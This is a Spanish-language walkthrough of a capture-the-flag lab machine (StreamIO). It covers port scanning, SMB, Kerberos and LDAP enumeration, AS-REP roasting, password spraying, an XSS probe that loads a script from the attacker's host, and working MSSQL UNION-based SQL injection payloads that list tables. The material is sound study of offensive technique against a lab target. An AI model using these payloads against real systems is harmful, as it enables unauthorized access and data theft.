
# Reconocimiento
```shell
nmap -p- --open -sS --min-rate 5000 -Pn -n -vvv 10.129.3.119 -oG allPorts
```

```shell

 [*] IP Address: 10.129.3.119
 [*] Open ports: 53,80,88,135,139,389,443,445,464,593,636,3268,3269,5985,9389,49667,49677,49678,49708,49734
```

```shell
nmap -p53,80,88,135,139,389,443,445,464,593,636,3268,3269,5985,9389,49667,49677,49678,49708,49734 -sCV -oN targeted 10.129.3.119
```

## SMB

```shell
nxc smb 10.129.13.11 
```

### Recursos compartidos

```shell
nxc smb 10.129.13.11 --shares
```

```shell
smbclient -L 10.129.13.11 -N
```

No podemos enumerar ningún recurso compartido

## Kerberos
Haremos una enumeración de usuarios a través de kerberos
```shell
kerbrute userenum --dc 10.129.13.11 -d streamIO.htb /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt 
```

Encontrando los usuarios
```ad-info
martin@streamIO.htb
administrator@streamIO.htb
```

Validamos los usuarios
```shell
kerbrute userenum --dc 10.129.13.11 -d streamIO.htb users.txt 
```

Viendo que son usuarios que existen

Probaremos si los usuarios son vulnerables a [[AS-REP Roasting]]
### AS-REP Roast Attack
```shell
impacket-GetNPUsers -no-pass -usersfile users.txt streamIO.htb/
```

Probaremos también si tienen el nombre de usuario como contraseña
### User as Password
```shell
nxc smb 10.129.13.11 -u users.txt -p users.txt
```

## LDAP
Enumeraremos el LDAP
```shell
ldapsearch -x -H ldap://10.129.13.11 -b "DC=streamIO,DC=local" 
```

Enumeramos posibles usuarios
```shell
dapsearch -x -H ldap://10.129.13.11 -b "DC=streamIO,DC=local" | grep -i userprincipalname
```

## HTTPS
AL no encontrar mas información relevante en las pruebas realizadas anteriormente probaremos accediendo al recurso web que esta levantado en el puerto 443
```shell
https://streamio.htb/
```

Vemos que hay una zona de CONTAC US, en la cual se indica al enviar el mensaje hay una persona revisando la incidencia y que envía una respuesta, probaremos a hacer una inyección XSS para ver si esto se acontece
```javascript
<script src="http://10.10.14.116/test"></script>
```

En nuestra maquina nos levantaremos un servidor con python
Vemos que no se nos devuelve ninguna respuesta

También hay una zona de login y de crearnos una cuenta, procederemos a creárnosla, observamos que no se nos crea la cuenta, suponiendo que el panel no funciona correctamente

También encontramos un subdominio al que podemos acceder
```shell
https://watch.streamio.htb/
```

Haremos de nuevo fuzzing en búsqueda de archivos .php
```shell
ffuf -c -u https://watch.streamio.htb/FUZZ.php -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
```

Encontrando un `search`, `index` y `blocked`, navegaremos a los recursos a ver de que se trata, encontrando una zona de búsqueda de peliculas en el caso de `search`

En este buscador de peliculas interceptamos la petición y vemos que si intentamos introducir una petición SQL por ejemplo nos muestra una ventana en la que se nos dice que la petición no es valida y al sesión se bloqueara.

Al estar trabajando sobre un Microsoft lo primero que tendremos que hacer es identificar el tipo de base de datos, que lo mas seguro es que se trate de un MSSQL

Podemos probar identificando el numero de columnas usando
```sql
'union select 1--
```

Hasta que se nos muestre algo diferente por pantalla en este caso se ha identificado hasta la columna numero 6
```sql
'union select 1,2,3,4,5,6--
```

Observamos que modificando las columnas podemos ver resultados por pantalla en este caso la columna numero 2 al ser modifica y por ejemplo introducir otro numero como un 9 se nos muestra en pantalla
```sql
'union select 1,9,3,4,5,6--
```

Pudiendo sacar la versión del servicio MSSQL
```sql
'union select 1,@@version,3,4,5,6--
```

```ad-info
Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)
```


Ayudándonos de payloads all the things podemos identificar el nombre de la base de datos que se esta usando
```sql
'union select 1,(SELECT DB_NAME()),3,4,5,6--
```

A continuacion buscaremos como listar las tablas
```sql
'union select 1,name,3,4,5,6  from streamio..sysobjects where xtype='U';--
```

Encontramos las tablas `movies` y la tabla `users`



